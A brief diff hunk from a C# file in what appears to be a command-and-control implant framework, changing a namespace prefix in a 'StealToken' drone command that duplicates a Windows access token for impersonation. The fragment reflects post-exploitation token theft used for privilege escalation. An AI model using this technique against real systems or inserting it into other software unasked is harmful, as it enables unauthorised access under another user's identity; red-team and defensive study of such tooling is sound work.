@@ -40,7 +40,7 @@ public sealed class StealToken : DroneCommand
         }
 
         var hTokenDup = DuplicateTokenEx(hToken,
-            DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+            Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
             SECURITY_IMPERSONATION_LEVEL.SECURITY_IMPERSONATION,
             TOKEN_TYPE.TOKEN_IMPERSONATION);
 
